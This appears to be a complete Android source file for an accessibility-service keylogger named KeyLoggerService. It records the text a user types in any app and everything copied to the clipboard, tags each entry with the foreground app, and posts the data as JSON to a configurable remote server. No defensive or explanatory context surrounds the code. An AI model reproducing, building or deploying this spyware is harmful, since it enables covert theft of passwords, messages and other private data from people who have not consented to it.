package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData; 
import android.content.ClipboardManager; 
import android.content.Context; 
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyLoggerService extends AccessibilityService {
    
    private static final String SERVER_URL = "YOUR_SERVER_URL";
    private String currentAppPackage = "unknown";
    
    private ClipboardManager clipboardManager; 

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
       
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboardManager != null) {
            clipboardManager.addPrimaryClipChangedListener(clipboardListener);
        }
        Log.d("KeyLoggerService", "Service Connected and Clipboard Listener attached.");
    }
    private final ClipboardManager.OnPrimaryClipChangedListener clipboardListener = 
        new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
            try {
                ClipData clip = clipboardManager.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                   
                    String clipboardText = clip.getItemAt(0).coerceToText(getApplicationContext()).toString();
                    
                    if (clipboardText != null && !clipboardText.isEmpty()) {
                        Log.d("KeyLoggerService", "Clipboard Data: " + clipboardText);
                        
                       
                        logData("clipboard", clipboardText);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().toString().isEmpty()) {
                this.currentAppPackage = event.getPackageName().toString();
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            
            if (text != null && text.length() > 2) {
                text = text.substring(1, text.length() - 1);
            } else if (text == null || text.length() <= 2) {
                return; 
            }
            
           
            logData("keystroke", text);
        }
    }

  
    private void logData(String logType, String data) {
        JSONObject logPayload = new JSONObject();
        try {
            logPayload.put("timestamp", System.currentTimeMillis());
            logPayload.put("app", this.currentAppPackage); 
            logPayload.put("type", logType);
            logPayload.put("data", data);
            
            Log.d("KeyLoggerService", "Logging JSON: " + logPayload.toString());
            sendToServer(logPayload.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void onInterrupt() {
        // Handle interruption
    }

  
    private void sendToServer(String jsonPayload) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode(); 
                // Log.d("KeyLoggerService", "Server Response: " + responseCode);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public void onDestroy() {
       
        super.onDestroy();
        if (clipboardManager != null) {
            clipboardManager.removePrimaryClipChangedListener(clipboardListener);
            Log.d("KeyLoggerService", "Service Destroyed and Clipboard Listener removed.");
        }
    }
}
